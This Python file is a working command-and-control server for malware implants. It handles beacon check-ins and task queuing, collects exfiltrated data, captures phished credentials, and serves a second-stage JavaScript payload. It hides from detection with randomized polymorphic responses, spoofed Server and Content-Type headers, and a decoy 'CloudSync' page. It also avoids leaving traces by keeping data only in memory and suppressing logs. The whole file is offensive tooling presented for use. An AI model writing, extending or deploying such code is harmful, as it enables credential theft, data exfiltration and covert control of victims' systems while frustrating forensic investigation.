# payload_server.py — Runs on the Fly VM, serves all dynamic payload routes
# This replaces the Sliver-only setup with a payload-agnostic API server

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os
import secrets
import time
import hashlib
import threading
from typing import Any, Optional

from polymorphic_renderer import PolymorphicRenderer


class PayloadServer(BaseHTTPRequestHandler):
    """
    Payload-agnostic C2 API server.
    Handles: beacon, tasking, exfil, credential vault, stager delivery.

    All responses are polymorphic — different structure every deployment.
    No static signatures. No consistent response format.
    """

    SESSION_KEY: str = os.environ.get("SESSION_KEY", secrets.token_hex(16))
    LISTEN_PORT: int = int(os.environ.get("LISTEN_PORT", 8443))

    # In-memory storage (no disk writes — anti-forensic)
    _creds: list[dict[str, Any]] = []
    _exfil: list[dict[str, Any]] = []
    _tasks: dict[str, list[dict[str, Any]]] = {}
    _beacons: dict[str, dict[str, Any]] = {}
    _renderer: Optional[PolymorphicRenderer] = None
    _lock = threading.Lock()

    @classmethod
    def init_renderer(cls, seed: Optional[str] = None) -> None:
        """Initialize the polymorphic renderer with a deployment-specific seed."""
        cls._renderer = PolymorphicRenderer(seed=seed)

    def _check_auth(self) -> bool:
        """Validate session key from X-CSRF-Token header."""
        token = self.headers.get("X-CSRF-Token", "")
        return token == self.SESSION_KEY

    def _send_polymorphic(self, data: bytes, status: int = 200) -> None:
        """Send a response with randomized container format."""
        if self._renderer is None:
            self._renderer = PolymorphicRenderer()
        response = self._renderer.render_api_response(None, "", self.SESSION_KEY, data)
        self.send_response(status)
        ct = secrets.choice([
            "application/octet-stream",
            "application/json",
            "image/png",
            "text/plain",
            "application/grpc+proto",
        ])
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(response)))
        self.send_header("Server", secrets.choice(["cloudflare", "nginx", "gunicorn"]))
        self.end_headers()
        self.wfile.write(response)

    def _send_html(self, html: str, status: int = 200) -> None:
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(html.encode())))
        self.send_header("Server", "cloudflare")
        self.end_headers()
        self.wfile.write(html.encode())

    def _send_js(self, js: str, status: int = 200) -> None:
        self.send_response(status)
        self.send_header("Content-Type", "application/javascript; charset=utf-8")
        self.send_header("Content-Length", str(len(js.encode())))
        self.send_header("Server", "cloudflare")
        self.end_headers()
        self.wfile.write(js.encode())

    def do_GET(self) -> None:
        """Handle GET requests: tasking, stager delivery, health checks."""
        path = self.path.split("?")[0]

        # Health check (no auth required)
        if path == "/health":
            self._send_polymorphic(b"ok")
            return

        if not self._check_auth():
            self._send_html(self._cover_page())
            return

        # Tasking endpoint — implant pulls its task queue
        if "/task" in path:
            implant_id = self.headers.get("X-Client-ID", "default")
            with self._lock:
                tasks = self._tasks.pop(implant_id, [])
            task_data = json.dumps(tasks).encode() if tasks else b"\x00"
            self._send_polymorphic(task_data)
            return

        # Stager delivery — serve the second-stage payload
        if "/stage2" in path or "/analytics" in path or "/telemetry" in path:
            if self._renderer is None:
                self._renderer = PolymorphicRenderer()
            stage2 = self._renderer.render_stager(None, self.SESSION_KEY, "")
            self._send_js(stage2)
            return

        # Unknown path — cover page
        self._send_html(self._cover_page())

    def do_POST(self) -> None:
        """Handle POST requests: beacons, exfil, credential capture."""
        path = self.path.split("?")[0]
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""

        if not self._check_auth():
            self._send_polymorphic(b"denied", status=401)
            return

        # Beacon — implant checking in
        if "/beacon" in path or "/sync" in path:
            implant_id = self.headers.get(
                "X-Client-ID", hashlib.md5(body).hexdigest()[:12]
            )
            with self._lock:
                self._beacons[implant_id] = {
                    "last_seen": time.time(),
                    "ip": self.client_address[0],
                    "data": body,
                }
            tasks = self._tasks.pop(implant_id, [])
            task_data = json.dumps(tasks).encode() if tasks else b"\x00"
            self._send_polymorphic(task_data)
            return

        # Exfil — implant sending captured data
        if "/exfil" in path or "/hook" in path or "/event" in path:
            with self._lock:
                self._exfil.append({
                    "ts": time.time(),
                    "ip": self.client_address[0],
                    "data": body,
                })
            self._send_polymorphic(b"ok")
            return

        # Credential capture — phishing/drainer results
        if "/auth" in path or "/verify" in path or "/session" in path or "/token" in path:
            try:
                cred = json.loads(body)
                with self._lock:
                    self._creds.append({
                        "ts": time.time(),
                        "ip": self.client_address[0],
                        "user": cred.get("u", ""),
                        "pass": cred.get("p", ""),
                        "raw": body,
                    })
            except Exception:
                with self._lock:
                    self._creds.append({
                        "ts": time.time(),
                        "ip": self.client_address[0],
                        "raw": body,
                    })
            self._send_polymorphic(b"ok")
            return

        # Unknown — deny
        self._send_polymorphic(b"denied", status=404)

    def _cover_page(self) -> str:
        """Legit-looking page for unauthenticated/unexpected traffic."""
        return """<!DOCTYPE html>
<html><head><title>CloudSync — File Synchronization Service</title>
<style>body{font-family:sans-serif;max-width:600px;margin:80px auto;padding:0 20px;color:#333}
h1{font-size:1.5rem}p{color:#666}.btn{display:inline-block;padding:10px 24px;background:#0070f3;
color:#fff;border-radius:6px;text-decoration:none;margin-top:20px}</style></head>
<body><h1>CloudSync</h1><p>Secure file synchronization across all your devices.</p>
<a href="#" class="btn">Sign In</a><p style="margin-top:40px;font-size:0.8rem;color:#999">
&copy; 2024 CloudSync. All rights reserved.</p></body></html>"""

    @classmethod
    def get_creds(cls) -> list[dict[str, Any]]:
        with cls._lock:
            return cls._creds.copy()

    @classmethod
    def get_exfil(cls) -> list[dict[str, Any]]:
        with cls._lock:
            return cls._exfil.copy()

    @classmethod
    def queue_task(cls, implant_id: str, task: dict[str, Any]) -> None:
        with cls._lock:
            cls._tasks.setdefault(implant_id, []).append(task)

    def log_message(self, format: str, *args: Any) -> None:
        pass  # suppress logging — anti-forensic


def start_server() -> None:
    """Entry point — called by the Docker entrypoint."""
    seed = os.environ.get("DEPLOYMENT_SEED", secrets.token_hex(16))
    PayloadServer.init_renderer(seed)

    server = HTTPServer(("0.0.0.0", PayloadServer.LISTEN_PORT), PayloadServer)
    print(f"[payload-server] Listening on :{PayloadServer.LISTEN_PORT}")
    print(f"[payload-server] Session key: {PayloadServer.SESSION_KEY[:8]}...")
    print(f"[payload-server] Renderer seed: {seed[:8]}...")
    server.serve_forever()


if __name__ == "__main__":
    start_server()
